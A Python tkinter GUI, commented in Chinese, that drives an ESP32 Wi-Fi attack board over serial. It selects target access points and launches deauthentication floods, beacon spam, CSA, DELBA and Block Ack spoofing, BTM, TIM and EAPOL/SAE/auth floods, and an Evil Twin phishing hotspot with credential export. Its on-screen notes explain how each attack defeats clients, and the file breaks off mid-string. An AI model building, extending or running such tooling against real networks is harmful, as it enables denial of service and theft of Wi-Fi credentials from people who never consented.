"""ESP32 Wireless-Attack 串口上位机（Windows / tkinter）。

页面结构（与固件 LVGL 菜单同构）：
    一级：Deauth 攻击 / Probe 攻击 / Evil Twin / 设备状态 / 日志
    二级：Deauth 的四种模式（单个 / 全部 / 只打勾选 / 排除勾选）
    三级：模式工作页——[扫描 AP] [选择目标…] [开始攻击] [停止] + 每 AP 发包数

目标选择是**弹窗**（不是嵌在页面里的滚动小表格）：
    · 弹窗里可过滤 SSID、重新扫描、全选/清空/反选
    · ONLY / EXCEPT 是勾选（多选），ONE / Evil Twin 是单选
    · 「确定」后回到同一个工作页，直接「开始攻击」
"""

import argparse
import queue
import sys
import threading
import time
import tkinter as tk
from tkinter import messagebox, ttk

import protocol
import serial
from serial.tools import list_ports

BAUDRATE = 115200
# Deauth reason codes that make sense as presets, plus the two dynamic modes.
# "random" asks the firmware to draw a fresh code per burst from the codes the
# standard defines; "custom" reads the entry next to the combobox (1..65535).
REASON_RANDOM = "random - 每次随机"
REASON_CUSTOM = "custom - 自定义（右侧填）"
# Codes the 802.11 standard actually defines (same list as the firmware pool).
REASON_DEFINED = set(list(range(1, 12)) + list(range(13, 25)))

REASONS = [
    (1, "1 - Unspecified"),
    (2, "2 - Previous auth no longer valid"),
    (3, "3 - Deauth leaving"),
    (4, "4 - Inactivity"),
    (5, "5 - AP unable to handle stations"),
    (6, "6 - Class 2 frame from nonassociated station"),
    (7, "7 - Class 3 frame from nonassociated station"),
    (15, "15 - 4-way handshake timeout"),
]

MENU = [
    ("deauth", "Deauth 攻击"),
    ("probe", "Probe 攻击"),
    ("csa", "CSA 欺骗"),
    ("delba", "DELBA 欺骗"),
    ("ba", "BA 会话攻击"),
    ("evil", "Evil Twin"),
    ("wnm", "WNM 劝退"),
    ("tim", "TIM 投毒"),
    ("eapol", "EAPOL 洪泛"),
    ("sae", "SAE 洪泛"),
    ("authflood", "Auth 洪泛"),
    ("pspoll", "PM 位欺骗"),
    ("status", "设备状态"),
    ("log", "日志"),
]

# (key, 标题, 是否勾选集, 说明)
DEAUTH_MODES = [
    ("one", "单个 AP", False, "对弹窗里选中的那一个 AP 发包"),
    ("all", "全部 AP", False, "对扫描到的全部 AP 轮流发包（自动跟随各 AP 信道）"),
    ("only", "只打勾选", True, "白名单：只打弹窗里勾选的 AP"),
    ("except", "排除勾选", True, "黑名单：打全部 AP，但排除弹窗里勾选的"),
]


BA_STEPS = ["512", "256", "1024", "2047", "0 (对照：不推窗口)"]

# 五个管理/数据帧模块的参数选项（文本里的英文前缀就是命令行 token）
WNM_MODES = [
    "cand - 带候选 BSS（推荐：客户端被导向一个不存在的 BSSID）",
    "bare - 不带候选列表（客户端只会自己扫一遍）",
]
TIM_MODES = [
    "tim - 置位：声称有缓存，客户端一直醒着来取",
    "clear - 清空：客户端睡过真实下行",
]
EAPOL_TIDS = [
    "6 - QoS TID6（默认，wpa_supplicant 的 EAPOL TID）",
    "-1 - 只发非 QoS 数据帧",
    "0 - QoS TID0",
    "5 - QoS TID5",
    "7 - QoS TID7",
]
SAE_ELEMS = [
    "point - P-256 生成元（默认：让 AP 走完昂贵那一步）",
    "rand - 随机点（对照组：AP 在校验阶段就丢弃）",
]
AUTH_MODES = [
    "both - 认证 + 关联（默认，一个身份两条帧）",
    "auth - 只发 Authentication",
    "assoc - 只发 Association Request",
]
# PS-Poll 那一半已删除：单播的子类型 10 帧在本 MAC 上发不出去（实测 0/10，
# 广播 RA 同样 16 字节 10/10 抓到），详见 attack-principles.md 附录 A。

DELBA_REASONS = [
    "37 - 不再使用该机制",
    "1 - 未指定原因",
    "32 - QoS 相关（未指定）",
    "38 - QoS 相关（对端未指定）",
    "39 - 对端不支持该机制",
]

AP_COLUMNS = ("pick", "idx", "ssid", "bssid", "band", "ch", "rssi", "enc")
AP_WIDTHS = {"pick": 40, "idx": 44, "ssid": 260, "bssid": 165, "band": 58,
             "ch": 52, "rssi": 62, "enc": 100}
AP_HEADINGS = {"pick": "选", "idx": "#", "ssid": "SSID", "bssid": "BSSID",
               "band": "频段", "ch": "信道", "rssi": "RSSI", "enc": "加密"}


class SerialLink:
    def __init__(self, port, events):
        self._events = events
        self._stop = threading.Event()
        self._write_lock = threading.Lock()
        self._ser = serial.Serial(
            port, BAUDRATE, timeout=0.1, write_timeout=1, dsrdtr=False, rtscts=False
        )
        # 不拉低 DTR/RTS：否则 CH340 会把 ESP32 按在复位或下载模式里。
        self._ser.dtr = False
        self._ser.rts = False
        self._thread = threading.Thread(target=self._reader, daemon=True)
        self._thread.start()

    def _reader(self):
        while not self._stop.is_set():
            try:
                raw = self._ser.readline()
            except Exception as exc:  # noqa: BLE001
                self._events.put(("error", f"串口读取失败：{exc}"))
                return
            if raw:
                self._events.put(("line", raw.decode("utf-8", "replace").rstrip()))

    def send(self, command):
        with self._write_lock:
            self._ser.write((command + "\r\n").encode())

    def close(self):
        self._stop.set()
        try:
            self._ser.close()
        except Exception:  # noqa: BLE001
            pass


class TargetDialog(tk.Toplevel):
    """目标选择弹窗。multi=True 勾选（ONLY/EXCEPT），multi=False 单选（ONE / Evil）。"""

    def __init__(self, app, multi, title):
        super().__init__(app.root)
        self.app = app
        self.multi = multi
        self.filter_var = tk.StringVar()
        self.filter_var.trace_add("write", lambda *_a: self.refresh())

        self.title(title)
        self.transient(app.root)
        self.geometry("860x580")
        self.minsize(720, 460)
        self._build()
        self.refresh()
        self.grab_set()
        self.protocol("WM_DELETE_WINDOW", self._cancel)
        self.bind("<Escape>", lambda _e: self._cancel())

    # ------------------------------------------------------------- 构建

    def _build(self):
        bar = ttk.Frame(self, padding=(10, 8, 10, 4))
        bar.pack(fill="x")
        ttk.Label(bar, text="过滤 SSID：").pack(side="left")
        ttk.Entry(bar, textvariable=self.filter_var, width=20).pack(side="left")
        ttk.Button(bar, text="重新扫描", width=10,
                   command=self.app.scan).pack(side="left", padx=6)
        self.info = ttk.Label(bar, text="")
        self.info.pack(side="left", padx=8)

        wrap = ttk.Frame(self, padding=(10, 0))
        wrap.pack(fill="both", expand=True)
        self.tree = ttk.Treeview(wrap, columns=AP_COLUMNS, show="headings",
                                 selectmode="browse")
        for col in AP_COLUMNS:
            self.tree.heading(col, text=AP_HEADINGS[col])
            self.tree.column(col, width=AP_WIDTHS[col],
                             anchor="w" if col in ("ssid", "bssid", "enc") else "center")
        scroll = ttk.Scrollbar(wrap, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scroll.set)
        self.tree.pack(side="left", fill="both", expand=True)
        scroll.pack(side="right", fill="y")
        self.tree.bind("<Button-1>", self._on_click)
        self.tree.bind("<Double-1>", self._on_double)

        bottom = ttk.Frame(self, padding=(10, 6))
        bottom.pack(fill="x")
        if self.multi:
            ttk.Button(bottom, text="全选", width=8,
                       command=self._pick_all).pack(side="left")
            ttk.Button(bottom, text="清空", width=8,
                       command=self._pick_none).pack(side="left", padx=4)
            ttk.Button(bottom, text="反选", width=8,
                       command=self._invert).pack(side="left")
        self.sel_label = ttk.Label(bottom, text="")
        self.sel_label.pack(side="left", padx=12)

        ttk.Button(bottom, text="确定", width=10,
                   command=self._ok).pack(side="right")
        ttk.Button(bottom, text="取消", width=10,
                   command=self._cancel).pack(side="right", padx=6)

    # ------------------------------------------------------------- 数据

    def _visible_rows(self):
        keyword = self.filter_var.get().strip().lower()
        rows = []
        for index in sorted(self.app.networks, key=int):
            net = self.app.networks[index]
            if keyword:
                haystack = f"{net['ssid']} {net['bssid']}".lower()
                if keyword not in haystack:
                    continue
            rows.append((index, net))
        return rows

    def refresh(self):
        if not self.winfo_exists():
            return
        self.tree.delete(*self.tree.get_children())
        for index, net in self._visible_rows():
            if self.multi:
                mark = "✓" if index in self.app.picked else ""
            else:
                mark = "●" if str(self.app.single_index) == index else ""
            self.tree.insert("", "end", iid=index, values=(
                mark, index, net["ssid"] or "(隐藏)", net["bssid"], net["band"],
                str(net["channel"]), str(net["rssi"]), net["enc"],
            ))
        total = len(self.app.networks)
        if self.app.scanning:
            state = "扫描中…"
        elif total:
            state = f"共 {total} 个 AP，当前显示 {len(self.tree.get_children())} 个"
        else:
            state = "还没有扫描结果，点“重新扫描”"
        self.info.config(text=state)
        self._refresh_sel_label()

    def _refresh_sel_label(self):
        if self.multi:
            picked = ",".join(sorted(self.app.picked, key=int))
            self.sel_label.config(text=f"已勾选 {len(self.app.picked)} 个："
                                      f"{picked or '无'}")
        else:
            index = self.app.single_index
            if index is None:
                self.sel_label.config(text="选中：无（双击一行）")
            else:
                ssid = self.app.networks.get(str(index), {}).get("ssid", "")
                self.sel_label.config(text=f"选中：#{index} {ssid or '(隐藏)'}")

    # ------------------------------------------------------------- 交互

    def _on_click(self, event):
        if self.tree.identify_region(event.x, event.y) != "cell":
            return None
        row = self.tree.identify_row(event.y)
        if not row:
            return None
        if self.tree.identify_column(event.x) == "#1":
            self._toggle(row)
            return "break"
        if not self.multi:
            self.app.single_index = int(row)
            self.refresh()
            self.tree.selection_set(row)
            return "break"
        return None

    def _on_double(self, event):
        row = self.tree.identify_row(event.y)
        if not row:
            return None
        self._toggle(row)
        if not self.multi:
            self._ok()
        return "break"

    def _toggle(self, row):
        if self.multi:
            if row in self.app.picked:
                self.app.picked.discard(row)
            else:
                self.app.picked.add(row)
        else:
            self.app.single_index = int(row)
        self.refresh()
        self.tree.selection_set(row)

    def _pick_all(self):
        for index, _net in self._visible_rows():
            self.app.picked.add(index)
        self.refresh()

    def _pick_none(self):
        for index, _net in self._visible_rows():
            self.app.picked.discard(index)
        self.refresh()

    def _invert(self):
        for index, _net in self._visible_rows():
            if index in self.app.picked:
                self.app.picked.discard(index)
            else:
                self.app.picked.add(index)
        self.refresh()

    def _ok(self):
        if not self.multi and self.app.single_index is None:
            messagebox.showinfo("提示", "请先双击一行选出目标 AP。", parent=self)
            return
        self.app.close_targets()

    def _cancel(self):
        self.app.close_targets()


class DeautherApp:
    def __init__(self, root, autoconnect=None):
        self.root = root
        self.events = queue.Queue()
        self.link = None
        self.networks = {}          # "0" -> {ssid,bssid,band,channel,rssi,enc}
        self.picked = set()         # 勾选的 index（字符串）
        self.single_index = None    # 单选的目标 index（int）
        self.dialog = None
        self.attacking = False
        self.scanning = False
        self.supports_evil_twin = False
        self.supports_5g = False
        self.current_page = None
        self.count_labels = {}
        self.scan_btns = {}
        self.target_btns = {}
        self.stats_trees = {}
        self.reason_var = tk.StringVar(value=REASONS[0][1])
        self.reason_custom_var = tk.StringVar()
        self.csa_mode_var = tk.StringVar(
            value="自动：2.4G AP → 随机 5G 信道，5G AP → 随机 2.4G 信道；循环攻击直到停止")
        self.csa_label = None
        self.delba_reason_var = tk.StringVar(value=DELBA_REASONS[0])
        self.delba_label = None
        self.ba_step_var = tk.StringVar(value=BA_STEPS[0])
        self.ba_label = None
        # 六个管理/数据帧页面共用：key -> 目标行 label
        self.mod_labels = {}
        self.wnm_mode_var = tk.StringVar(value=WNM_MODES[0])
        self.wnm_timer_var = tk.StringVar(value="10")
        self.wnm_ch_var = tk.StringVar(value="0")
        self.tim_mode_var = tk.StringVar(value=TIM_MODES[0])
        self.tim_aid_var = tk.StringVar(value="0")
        self.eapol_tid_var = tk.StringVar(value=EAPOL_TIDS[0])
        self.eapol_mac_var = tk.StringVar()
        self.sae_elem_var = tk.StringVar(value=SAE_ELEMS[0])
        self.sae_gap_var = tk.StringVar(value="50")
        self.auth_mode_var = tk.StringVar(value=AUTH_MODES[0])
        self.auth_auto_var = tk.BooleanVar(value=True)
        self.pspoll_mac_var = tk.StringVar()

        root.title("ESP32 Wireless Attack 上位机")
        root.geometry("1040x700")
        root.minsize(900, 620)

        self._build_shell()
        self._build_pages()
        self._refresh_ports()
        self.show_page("home")
        self._log("就绪：选择串口后点“连接”。", "info")

        if autoconnect:
            self.port_var.set(autoconnect)
            self.root.after(200, self.connect)
        self.root.after(60, self._pump)
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    # ---------------------------------------------------------------- 外壳

    def _build_shell(self):
        top = ttk.Frame(self.root, padding=(10, 8))
        top.pack(fill="x")
        self.back_btn = ttk.Button(top, text="← 返回", width=8, command=self.go_back,
                                   state="disabled")
        self.back_btn.pack(side="left", padx=(0, 10))
        ttk.Label(top, text="串口：").pack(side="left")
        self.port_var = tk.StringVar()
        self.port_combo = ttk.Combobox(top, textvariable=self.port_var, width=24, state="readonly")
        self.port_combo.pack(side="left")
        ttk.Button(top, text="刷新", width=6, command=self._refresh_ports).pack(side="left", padx=4)
        self.connect_btn = ttk.Button(top, text="连接", width=8, command=self.connect)
        self.connect_btn.pack(side="left")
        self.disconnect_btn = ttk.Button(top, text="断开", width=8, command=self.disconnect,
                                         state="disabled")
        self.disconnect_btn.pack(side="left", padx=4)
        self.page_title = ttk.Label(top, text="", font=("", 11, "bold"))
        self.page_title.pack(side="right")

        self.body = ttk.Frame(self.root, padding=(10, 0))
        self.body.pack(fill="both", expand=True)

        self.status_var = tk.StringVar(value="未连接")
        ttk.Label(self.root, textvariable=self.status_var, relief="sunken", anchor="w",
                  padding=4).pack(fill="x", side="bottom")

    @staticmethod
    def _make_page():
        return ttk.Frame()

    def _build_pages(self):
        self.pages = {}
        self.pages["home"] = self._build_home()
        self.pages["deauth"] = self._build_deauth_page()
        for key, label, needs_pick, hint in DEAUTH_MODES:
            self.pages[key] = self._build_mode_page(key, label, needs_pick, hint)
        self.pages["probe"] = self._build_probe_page()
        self.pages["csa"] = self._build_csa_page()
        self.pages["delba"] = self._build_delba_page()
        self.pages["ba"] = self._build_ba_page()
        self.pages["evil"] = self._build_evil_page()
        self.pages["wnm"] = self._build_wnm_page()
        self.pages["tim"] = self._build_tim_page()
        self.pages["eapol"] = self._build_eapol_page()
        self.pages["sae"] = self._build_sae_page()
        self.pages["authflood"] = self._build_authflood_page()
        self.pages["pspoll"] = self._build_pspoll_page()
        self.pages["status"] = self._build_status_page()
        self.pages["log"] = self._build_log_page()

    def _build_home(self):
        page = self._make_page()
        ttk.Label(page, text="选择攻击方式 / 功能", font=("", 13, "bold")).pack(pady=(30, 16))
        grid = ttk.Frame(page)
        grid.pack()
        for i, (key, label) in enumerate(MENU):
            ttk.Button(grid, text=label, width=22, command=lambda k=key: self.show_page(k)).grid(
                row=i // 3, column=i % 3, padx=8, pady=8, ipady=12
            )
        ttk.Label(
            page,
            text="每个攻击页里：扫描 AP → 选择目标(弹窗) → 开始 / 停止。",
            foreground="#777777",
        ).pack(pady=(24, 0))
        return page

    # ------------------------------------------------------------ 各页面

    def _build_deauth_page(self):
        page = self._make_page()
        ttk.Label(page, text="选择 Deauth 模式", font=("", 12, "bold")).pack(anchor="w",
                                                                          pady=(10, 4))
        ttk.Label(page, text="每个模式页里都有：扫描 AP → 选择目标 → 开始 / 停止。",
                  foreground="#777777").pack(anchor="w", pady=(0, 12))
        for key, label, _needs_pick, hint in DEAUTH_MODES:
            row = ttk.Frame(page)
            row.pack(fill="x", pady=4)
            ttk.Button(row, text=label, width=20,
                       command=lambda k=key: self.show_page(k)).pack(side="left", ipady=6)
            ttk.Label(row, text=hint, foreground="#777777").pack(side="left", padx=10)
        return page

    def _build_mode_page(self, key, title, needs_pick, hint):
        page = self._make_page()
        ttk.Label(page, text=f"Deauth · {title}", font=("", 12, "bold")).pack(anchor="w")
        ttk.Label(page, text=hint, foreground="#777777").pack(anchor="w", pady=(0, 8))

        bar = ttk.Frame(page)
        bar.pack(fill="x", pady=(0, 6))
        btn = ttk.Button(bar, text="扫描 AP", width=11, command=self.scan, state="disabled")
        btn.pack(side="left")
        self.scan_btns[key] = btn
        tbtn = ttk.Button(bar, text="选择目标…", width=13,
                          command=lambda: self.open_targets(needs_pick),
                          state="disabled")
        tbtn.pack(side="left", padx=6)
        self.target_btns[key] = tbtn
        self.count_labels[key] = ttk.Label(bar, text="未扫描")
        self.count_labels[key].pack(side="left", padx=10)

        actions = ttk.Frame(page)
        actions.pack(fill="x", pady=(2, 4))
        ttk.Label(actions, text="reason：").pack(side="left")
        ttk.Combobox(actions, textvariable=self.reason_var, width=26, state="readonly",
                     values=[text for _, text in REASONS] + [REASON_RANDOM, REASON_CUSTOM]
                     ).pack(side="left")
        ttk.Label(actions, text=" 或自定义：").pack(side="left")
        ttk.Entry(actions, textvariable=self.reason_custom_var, width=8).pack(side="left")
        ttk.Button(actions, text="开始攻击", width=12,
                   command=lambda: self.start_mode(key)).pack(side="left", padx=(12, 4))
        ttk.Button(actions, text="停止", width=8, command=self.stop).pack(side="left")

        stats = ttk.LabelFrame(page, text="每 AP 发包数（STATS）", padding=4)
        stats.pack(fill="both", expand=True, pady=(4, 0))
        ttk.Button(stats, text="刷新", width=8,
                   command=lambda: self._send("STATS")).pack(anchor="w")
        tree = ttk.Treeview(stats, columns=("idx", "bssid", "ch", "frames"), show="headings",
                            height=6)
        for col, label, width in (("idx", "#", 60), ("bssid", "BSSID", 200), ("ch", "信道", 80),
                                  ("frames", "Deauth 帧数", 140)):
            tree.heading(col, text=label)
            tree.column(col, width=width, anchor="center")
        tree.pack(fill="both", expand=True, pady=(4, 0))
        self.stats_trees[key] = tree
        return page

    def _build_probe_page(self):
        page = self._make_page()
        ttk.Label(page, text="Probe 攻击（广播泛洪）", font=("", 12, "bold")).pack(anchor="w",
                                                                             pady=(10, 4))
        ttk.Label(page, text="伪造 AP 泛洪：持续广播 Beacon + Probe Response（随机 SSID/BSSID）",
                  foreground="#777777").pack(anchor="w", pady=(0, 12))
        row = ttk.Frame(page)
        row.pack(fill="x")
        ttk.Button(row, text="开始泛洪", width=14, command=self.probe_broadcast).pack(side="left")
        ttk.Button(row, text="停止", width=10, command=self.stop).pack(side="left", padx=8)
        ttk.Label(
            page,
            text=(
                "说明：\n"
                "• 不需要扫描、不需要目标——广播泛洪与当前环境无关；\n"
                "• Beacon（子类型 8）与 Probe Response（5）都走 legacy 速率，任何客户端都能收到；\n"
                "• 每 120 ms 换一次信道，覆盖 1–13（C5 上还会覆盖 5G）；\n"
                "• 发送次数看底栏 Probe 帧数。"
            ),
            justify="left",
        ).pack(anchor="w", pady=(16, 0))
        return page

    def _build_csa_page(self):
        page = self._make_page()
        ttk.Label(page, text="CSA 欺骗（信道切换通告）", font=("", 12, "bold")).pack(
            anchor="w", pady=(10, 4))
        ttk.Label(
            page,
            text="伪造 AP 的 CSA：在目标信道上按 count 递减播报，然后跳到新信道用克隆 beacon 接应。"
                 "Action 帧属于 robust（PMF 会拦），beacon 里的 CSA IE 不受保护——两条都发。",
            foreground="#777777",
        ).pack(anchor="w", pady=(0, 8))

        bar = ttk.Frame(page)
        bar.pack(fill="x", pady=(0, 6))
        btn = ttk.Button(bar, text="扫描 AP", width=11, command=self.scan, state="disabled")
        btn.pack(side="left")
        self.scan_btns["csa"] = btn
        tbtn = ttk.Button(bar, text="选择目标…", width=13,
                          command=lambda: self.open_targets(False), state="disabled")
        tbtn.pack(side="left", padx=6)
        self.target_btns["csa"] = tbtn
        self.csa_label = ttk.Label(bar, text="未扫描")
        self.csa_label.pack(side="left", padx=10)

        params = ttk.Frame(page)
        params.pack(fill="x", pady=(4, 6))
        ttk.Label(params, textvariable=self.csa_mode_var, foreground="#555555").pack(side="left")

        actions = ttk.Frame(page)
        actions.pack(fill="x", pady=(6, 4))
        ttk.Button(actions, text="开始 CSA", width=14,
                   command=self.start_csa).pack(side="left")
        ttk.Button(actions, text="停止", width=10,
                   command=self.csa_stop).pack(side="left", padx=8)

        ttk.Label(
            page,
            text=("说明：\n"
                  "• 选一个 AP 即可：2.4G 的 AP 会被通告到一个随机 5G 信道，5G 的 AP 反之；\n"
                  "• count 从 5 递减到 1、每 100 ms 一轮，同时发广播与单播 Action 帧 + 带 CSA IE 的 Beacon；\n"
                  "• 每轮结束后在新信道用同 BSSID/SSID/RSN 的克隆 beacon 顶 5 秒，然后自动开始下一轮；\n"
                  "• 循环直到“停止”；底栏 CSA 字段显示 idle / announce / hold，帧数看 csaf。"),
            justify="left",
        ).pack(anchor="w", pady=(12, 0))
        return page

    def _build_delba_page(self):
        page = self._make_page()
        ttk.Label(page, text="DELBA 欺骗（拆除 Block Ack 会话）", font=("", 12, "bold")).pack(
            anchor="w", pady=(10, 4))
        ttk.Label(
            page,
            text="伪造 AP 发 DELBA（Category 3 / Action 2），把客户端的块确认会话拆掉："
                 "链路还在，聚合没了，吞吐量掉到单帧确认。DELBA 属于 robust 管理帧类别，PMF 强制时会拦，实测是非 PMF 链路。",
            foreground="#777777", wraplength=900, justify="left",
        ).pack(anchor="w", pady=(0, 8))

        bar = ttk.Frame(page)
        bar.pack(fill="x", pady=(0, 6))
        btn = ttk.Button(bar, text="扫描 AP", width=11, command=self.scan, state="disabled")
        btn.pack(side="left")
        self.scan_btns["delba"] = btn
        tbtn = ttk.Button(bar, text="选择目标…", width=13,
                          command=lambda: self.open_targets(False), state="disabled")
        tbtn.pack(side="left", padx=6)
        self.target_btns["delba"] = tbtn
        self.delba_label = ttk.Label(bar, text="未扫描")
        self.delba_label.pack(side="left", padx=10)

        params = ttk.Frame(page)
        params.pack(fill="x", pady=(4, 6))
        ttk.Label(params, text="reason code：").pack(side="left")
        ttk.Combobox(params, textvariable=self.delba_reason_var, values=DELBA_REASONS,
                     state="readonly", width=26).pack(side="left")
        ttk.Label(params, text="   （37 是真实 AP 拆会话时最常用的值）",
                  foreground="#555555").pack(side="left")

        actions = ttk.Frame(page)
        actions.pack(fill="x", pady=(6, 4))
        ttk.Button(actions, text="开始 DELBA", width=14,
                   command=self.start_delba).pack(side="left")
        ttk.Button(actions, text="停止", width=10,
                   command=self.delba_stop).pack(side="left", padx=8)

        ttk.Label(
            page,
            text=("说明：\n"
                  "• 选一个 AP 即可，攻击板会停在该 AP 的信道上；\n"
                  "• 先听：从 QoS 数据帧 / BA 控制帧 / ADDBA 里认出客户端和它在用的 TID；\n"
                  "• 再发：对每个已知客户端，按 TID 单播 DELBA（AP→STA 与 STA→AP 两个方向都伪造）；"
                  "还没听到客户端时退化为广播 DELBA；\n"
                  "• 客户端重新建会话（ADDBA）会被再拆一次，所以链路会一直“连着但很慢”；\n"
                  "• 底栏 DELBA 字段：on/off、帧数 delbaf、客户端数 delbac、TID 位图 delbat。"),
            justify="left",
        ).pack(anchor="w", pady=(12, 0))
        return page

    def _build_ba_page(self):
        page = self._make_page()
        ttk.Label(page, text="BA 会话攻击（Block Ack 会话劫持）", font=("", 12, "bold")).pack(
            anchor="w", pady=(10, 4))
        ttk.Label(
            page,
            text="DELBA 清场 → 伪造 ADDBA（用我们给的 SSN 种植接收窗口）→ BAR 把窗口顶在真实序列号前面。"
                 "目标不断连，但那个 TID 的 QoS 数据会卡死，多数实现要重新关联才恢复。",
            foreground="#777777", wraplength=900, justify="left",
        ).pack(anchor="w", pady=(0, 8))

        bar = ttk.Frame(page)
        bar.pack(fill="x", pady=(0, 6))
        btn = ttk.Button(bar, text="扫描 AP", width=11, command=self.scan, state="disabled")
        btn.pack(side="left")
        self.scan_btns["ba"] = btn
        tbtn = ttk.Button(bar, text="选择目标…", width=13,
                          command=lambda: self.open_targets(False), state="disabled")
        tbtn.pack(side="left", padx=6)
        self.target_btns["ba"] = tbtn
        self.ba_label = ttk.Label(bar, text="未扫描")
        self.ba_label.pack(side="left", padx=10)

        params = ttk.Frame(page)
        params.pack(fill="x", pady=(4, 6))
        ttk.Label(params, text="SN 步进：").pack(side="left")
        ttk.Combobox(params, textvariable=self.ba_step_var, values=BA_STEPS,
                     state="readonly", width=18).pack(side="left")
        ttk.Label(params, text="   （把窗口顶到真实序列号前面多少帧；0–127 是对照组）",
                  foreground="#555555").pack(side="left")

        actions = ttk.Frame(page)
        actions.pack(fill="x", pady=(6, 4))
        ttk.Button(actions, text="开始 BA 攻击", width=14,
                   command=self.start_ba).pack(side="left")
        ttk.Button(actions, text="停止", width=10, command=self.ba_stop).pack(side="left", padx=8)

        ttk.Label(
            page,
            text=("说明：\n"
                  "• 选一个 AP，攻击板会停到它的信道上；\n"
                  "• 先按 QoS 数据帧/ADDBA 学到客户端与 TID，再按 TID 双向伪造；\n"
                  "• 底栏 BA 字段：on/off、ADDBA 帧数、BAR 帧数、DELBA 帧数、最后写入的 SSN；\n"
                  "• 实验室结论：只发 2 帧伪造 ADDBA 就能让该 TID 冻结且不自愈（需重新关联），\n"
                  "  但“窗口被推走”这一步还没单独证明（需要 mac80211 目标）。"),
            justify="left",
        ).pack(anchor="w", pady=(12, 0))
        return page

    def _build_evil_page(self):
        page = self._make_page()
        ttk.Label(page, text="Evil Twin", font=("", 12, "bold")).pack(anchor="w")
        ttk.Label(page, text="扫描 → 弹窗里选一个 AP → 克隆并开钓鱼热点",
                  foreground="#777777").pack(anchor="w", pady=(0, 8))
        bar = ttk.Frame(page)
        bar.pack(fill="x", pady=(0, 6))
        btn = ttk.Button(bar, text="扫描 AP", width=11, command=self.scan, state="disabled")
        btn.pack(side="left")
        self.scan_btns["evil"] = btn
        tbtn = ttk.Button(bar, text="选择目标…", width=13,
                          command=lambda: self.open_targets(False), state="disabled")
        tbtn.pack(side="left", padx=6)
        self.target_btns["evil"] = tbtn
        self.count_labels["evil"] = ttk.Label(bar, text="未扫描")
        self.count_labels["evil"].pack(side="left", padx=10)

        row = ttk.Frame(page)
        row.pack(fill="x", pady=4)
        self.twin_btn = ttk.Button(row, text="克隆并开钓鱼热点", width=20, command=self.evil_twin,
                                   state="disabled")
        self.twin_btn.pack(side="left")
        self.twin_stop_btn = ttk.Button(row, text="停止", width=10, command=self.evil_twin_stop,
                                        state="disabled")
        self.twin_stop_btn.pack(side="left", padx=8)
        self.creds_btn = ttk.Button(row, text="导出凭据", width=12, command=self.show_creds,
                                    state="disabled")
        self.creds_btn.pack(side="left")
        return page

    # ------------------------------------------- 802.11v / TIM / EAPOL / SAE / Auth

    def _target_bar(self, page, key):
        """扫描 / 选目标 + 目标行：五页共用（都是单 AP 目标）。"""
        bar = ttk.Frame(page)
        bar.pack(fill="x", pady=(0, 6))
        btn = ttk.Button(bar, text="扫描 AP", width=11, command=self.scan, state="disabled")
        btn.pack(side="left")
        self.scan_btns[key] = btn
        tbtn = ttk.Button(bar, text="选择目标…", width=13,
                          command=lambda: self.open_targets(False), state="disabled")
        tbtn.pack(side="left", padx=6)
        self.target_btns[key] = tbtn
        label = ttk.Label(bar, text="未扫描")
        label.pack(side="left", padx=10)
        self.mod_labels[key] = label
        return bar

    def _build_wnm_page(self):
        page = self._make_page()
        ttk.Label(page, text="802.11v BTM Request 欺骗（劝退 STA）",
                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
        ttk.Label(
            page,
            text="伪造 AP 发 WNM Action（category 10 / action 7）：Disassociation Imminent 置位，"
                 "客户端于是“自愿”漫游或离网。它属于 robust 管理帧类别：PMF 关闭/可选（大多数 WPA2）时有效，强制 PMF 时被驱动丢弃。",
            foreground="#777777", wraplength=920, justify="left",
        ).pack(anchor="w", pady=(0, 8))
        self._target_bar(page, "wnm")

        params = ttk.Frame(page)
        params.pack(fill="x", pady=(4, 6))
        ttk.Label(params, text="模式：").pack(side="left")
        ttk.Combobox(params, textvariable=self.wnm_mode_var, values=WNM_MODES,
                     state="readonly", width=44).pack(side="left")
        ttk.Label(params, text="  disassoc timer：").pack(side="left")
        ttk.Entry(params, textvariable=self.wnm_timer_var, width=6).pack(side="left")
        ttk.Label(params, text="  tbtt").pack(side="left")
        ttk.Label(params, text="  候选信道（0=自动）：").pack(side="left")
        ttk.Entry(params, textvariable=self.wnm_ch_var, width=6).pack(side="left")

        actions = ttk.Frame(page)
        actions.pack(fill="x", pady=(6, 4))
        ttk.Button(actions, text="开始 BTM", width=14, command=self.start_wnm).pack(side="left")
        ttk.Button(actions, text="停止", width=10, command=self.wnm_stop).pack(side="left", padx=8)

        ttk.Label(
            page,
            text=("说明：\n"
                  "• 只对声明支持 11v 的 STA 生效（Extended Capabilities 的 BSS Transition 位），"
                  "不支持的会被跳过，计数在 wnmskip；\n"
                  "• timer 必须 ≥1，填 0 客户端不会扫；每 300 ms 对每个客户端重发一次，最多 8 个；\n"
                  "• 底栏：wnmf 已发帧、wnmc 支持 11v 的客户端、wnmskip 被跳过的、"
                  "wnmresp 客户端回的 BTM Response 数、wnms 回的状态码。"),
            justify="left",
        ).pack(anchor="w", pady=(12, 0))
        return page

    def _build_tim_page(self):
        page = self._make_page()
        ttk.Label(page, text="TIM 投毒（克隆 beacon 篡改省电位图）",
                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
        ttk.Label(
            page,
            text="克隆目标 AP 的 beacon（同 BSSID/SSID/RSN/capability/interval），只改 TIM 元素："
                 "按 AID 置位让客户端白等，或清空让它睡过真实下行。beacon 不受 PMF 保护。",
            foreground="#777777", wraplength=920, justify="left",
        ).pack(anchor="w", pady=(0, 8))
        self._target_bar(page, "tim")

        params = ttk.Frame(page)
        params.pack(fill="x", pady=(4, 6))
        ttk.Label(params, text="模式：").pack(side="left")
        ttk.Combobox(params, textvariable=self.tim_mode_var, values=TIM_MODES,
                     state="readonly", width=38).pack(side="left")
        ttk.Label(params, text="  受害 AID（0=学到的全部）：").pack(side="left")
        ttk.Entry(params, textvariable=self.tim_aid_var, width=6).pack(side="left")

        actions = ttk.Frame(page)
        actions.pack(fill="x", pady=(6, 4))
        ttk.Button(actions, text="开始克隆", width=14, command=self.start_tim).pack(side="left")
        ttk.Button(actions, text="停止", width=10, command=self.tim_stop).pack(side="left", padx=8)

        ttk.Label(
            page,
            text=("说明：\n"
                  "• 必须先听到目标 AP 的真 beacon 才会发第一帧（否则克隆出来是个“坏网络”），"
                  "timreal 就是这个计数；\n"
                  "• AID 不在 beacon 里，它来自 Association Response，靠嗅探学习；学不到时按 AID 1 兜底；\n"
